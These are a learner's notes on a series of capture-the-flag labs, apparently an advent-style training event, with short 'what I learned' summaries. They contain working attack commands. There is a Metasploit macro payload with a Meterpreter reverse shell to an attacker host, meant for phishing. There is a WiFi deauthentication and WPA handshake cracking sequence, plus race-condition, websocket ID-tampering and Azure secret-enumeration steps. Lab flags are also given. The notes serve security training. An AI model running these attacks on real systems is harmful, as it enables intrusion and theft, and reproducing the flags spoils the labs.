# Day 9

## What I learned:
- Relevance of GRC
- Varrious aspects that are involved in Risk assessment 




# Day 10

- Create a document with the malcicious macro using metasploit 
- Use the following commands after opening msfconsole
    ``` set payload windows/meterpreter/reverse_tcp //To speciy the reverse shell payload 
    use exploit/multi/fileformat/office_word_macro
    set LHOST 10.10.13.209
    set LPORT 8888
    exploit //to generate the payload
    ```

- Now we must use the specified port to listen for incoming connections, once again using metasploit
    ```
    use multi/handler 
    set payload windows/meterpreter/reverse_tcp
    set LHOST 10.10.13.209
    set LPORT 8888
    exploit
    ```

- We can then email the macro to the target, and use this connection to find the flag

## What I learned
- Macros 
- How Phishing works



# Day 11

- Run ``` iw dev ``` to show any wireless devices.
- We can then use ``` iw dev wlan2 scan ``` to identify nearby networks
- Now we set wlan 2 to monitor mode
- We use airodump to capture wifi traffic nearby 
    ```
        airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
    ```
- This captures for the specific bssid 
- Now we use aireplay to send deauthenitcation packets to the target in order to create a temporary disconnection
- When it connects again we can receive the handshake
 ``` sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2 ```

- We use aircrack to perform a dictionary attack to find the passkey 
 ``` sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap ```
 
 - we get 'fluffy/champ24' as the passkey


 ## What I learned 
 - Different types of wifi attacks
 - vulnerabiliry in WPA and WPS
 - Using aireplay, airodump and aircrack



# Day 12

 - Open the website on the burpsuite browser with intercept on
 - Transfer 500 to the other account to generate the transferring request 
 - Send this command to the repeater 
 - Duplicate this request 10 times and create a tab so all can be run simultaneously 
 - Now we send this tab in parallel 
 - This causes a negative balance in the account 
 - We repeat this with the new account to get the flag: THM{WON_THE_RACE_007}

 ## What I learned
 - How a race condition attack works 

# Day 13
 - Open the website om the burpsuite browser 
 - Set intercept settings to capture packets between client to server and vice verse
 - Send a track request and change the id to track the target, this produces the first flag: THM{dude_where_is_my_car}
 - Now send a message and again change the user id to get the second flag: THM{my_name_is_malware._mayor_malware}

 ## What I learned:
 - How websockets work
 - Vulnerabilities


# Day 14

 - Opening the website, we get an error page
 - Nowe we open burpsuite and turn off intercept 
 - Add a new listener with the attackbox's ip
 - Now we run the script that has been stored to capture network traffic from the website to our device
 - This gives us all the login information for the various users, including Admin 


# Day 15

 - GPO can be used to enforce policies 
 - Open group policy management 
 - Create a new GPO for the server domain, named password policies.
 - Here, we can set conditions to ensure strength of the password 
 - We use Get-GPO to list all GPOs under the domain controller 
 - Windows comes with an event user, which stores a record of all activities
 - powershell stores all the commands that have been inputted. This file can be found in
    %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

## What I learned
- introduction to Active directory
- AD attacks
- Event viewing 
- PowerShell logs


# Day 16

- Open the Microsoft Azure lab 
- Activate the Azure command line to navigate through the service
- ``` az ad group list ``` to list all the groups
- ``` az ad group member list --group "Secret Recovery Group" ``` to list the members in thr group 
- ``` az account clear ``` to log out and clear session
- ``` az keyvault list ``` to see all the keys accessible to this account 
    ```   
    [
  {
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "location": "eastus",
    "name": "warevillesecrets",
    "resourceGroup": "rg-aoc-akv",
    "tags": {},
    "type": "Microsoft.KeyVault/vaults"
  }
    ]
    ```

- ``` az keyvault secret list --vault-name warevillesecrets ``` to Check the secrets available to this keyvault 
- this gives us the name 'aoc2024' which can be used to access the value stored int the keyvault 

## What I learned
- introduction to Azure
- ACLI
